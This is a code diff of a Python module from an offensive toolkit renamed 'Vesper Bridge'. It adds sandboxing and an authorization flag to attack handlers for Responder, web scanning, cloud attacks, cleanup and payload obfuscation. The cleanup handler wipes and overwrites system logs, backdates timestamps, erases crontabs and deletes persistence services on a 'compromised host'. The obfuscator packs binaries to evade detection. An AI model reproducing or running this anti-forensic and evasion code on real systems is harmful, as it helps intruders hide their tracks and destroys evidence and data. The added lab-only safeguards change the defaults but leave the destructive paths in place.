@@ -1,12 +1,20 @@
-# X404X Bridge — Additional Attack Handlers
+# Vesper Bridge — Additional Attack Handlers
 # =========================================
 # Responder, Web Scanner, Cloud Modules, Cleanup, Obfuscator
+#
+# SAFETY: file-touching handlers (cleanup, obfuscate) are sandboxed to
+# the lab root (modules/bridge/safety.py). Destructive cleanup paths
+# additionally require explicit authorization (VESPER_AUTHORIZED=1).
 
 import os
 import random
 import re
 import subprocess
+import sys
 from pathlib import Path
+
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
+from safety import is_authorized, resolve_in_lab, sandbox_result, sandbox_write  # noqa: E402
 
 
 # ============================================================
@@ -422,13 +430,24 @@ def _attack_gcp(action: str) -> dict:
 # ============================================================
 
 def run_cleanup(params: dict) -> dict:
-    """Clean up traces on the compromised host."""
+    """Clean up traces on the compromised host.
+
+    SAFETY: in lab-only mode (the default) log wiping is redirected to
+    copies inside the lab sandbox, and cron/systemd removal requires
+    VESPER_AUTHORIZED=1.
+    """
     wipe_logs = params.get("wipe_logs", True)
     clear_timestamps = params.get("clear_timestamps", True)
     remove_persistence = params.get("remove_persistence", True)
     secure_delete = params.get("secure_delete", False)
 
     results = {"actions": [], "errors": []}
+
+    if not is_authorized():
+        results["sandboxed"] = True
+        results["actions"].append(
+            "lab-only mode: destructive cleanup limited to sandboxed copies"
+        )
 
     if wipe_logs:
         log_files = [
@@ -438,6 +457,13 @@ def run_cleanup(params: dict) -> dict:
         ]
         for lf in log_files:
             try:
+                if not is_authorized():
+                    # sandbox: only touch a copy inside the lab root
+                    sandboxed = sandbox_write(lf.lstrip("/").replace("/", "_"))
+                    if isinstance(sandboxed, dict):
+                        results["errors"].append(f"wipe {lf}: {sandboxed['error']}")
+                        continue
+                    lf = str(sandboxed)
                 if os.path.exists(lf):
                     if secure_delete:
                         # Overwrite with random data then truncate
@@ -450,12 +476,18 @@ def run_cleanup(params: dict) -> dict:
 
     if clear_timestamps:
         try:
-            subprocess.run(["touch", "-t", "202001010000", "/tmp/.x404x_timestamp_ref"], timeout=5)
-            results["actions"].append("timestamps_cleared")
+            if is_authorized():
+                subprocess.run(["touch", "-t", "202001010000", "/tmp/.vesper_timestamp_ref"], timeout=5)
+                results["actions"].append("timestamps_cleared")
+            else:
+                results["actions"].append("timestamps: skipped (sandboxed)")
         except Exception as e:
             results["errors"].append(f"timestamps: {e}")
 
     if remove_persistence:
+        if not is_authorized():
+            results["actions"].append("remove_persistence: skipped (sandboxed — requires authorization)")
+            return results
         # Remove cron entries
         try:
             subprocess.run("crontab -r", shell=True, timeout=5)
@@ -463,7 +495,7 @@ def run_cleanup(params: dict) -> dict:
         except Exception:
             pass
         # Remove systemd services
-        for svc in ["x404x-agent", "vault-kernel"]:
+        for svc in ["vesper-agent", "vault-kernel"]:
             svc_path = f"/etc/systemd/system/{svc}.service"
             if os.path.exists(svc_path):
                 try:
@@ -514,6 +546,12 @@ def run_obfuscate(params: dict) -> dict:
     # Apply obfuscation
     try:
         output_path = input_path + ".obf"
+        sandboxed = sandbox_write(output_path)
+        if isinstance(sandboxed, dict):
+            results["error"] = sandboxed["error"]
+            results["sandboxed"] = True
+            return results
+        output_path = str(sandboxed)
         with open(input_path, "rb") as fi:
             data = bytearray(fi.read())
 
@@ -558,3 +596,18 @@ def run_obfuscate(params: dict) -> dict:
             results["error"] += "; upx not installed"
 
     return results
+
+
+# ============================================================
+# ROUTE REGISTRATION (uniform handler contract)
+# ============================================================
+
+def register_routes(registry: dict) -> None:
+    """Expose this module's handlers under the 'attacks' group."""
+    registry["attacks"] = {
+        "responder": run_responder,
+        "webscan": run_webscan,
+        "cloud": run_cloud_attack,
+        "cleanup": run_cleanup,
+        "obfuscate": run_obfuscate,
+    }
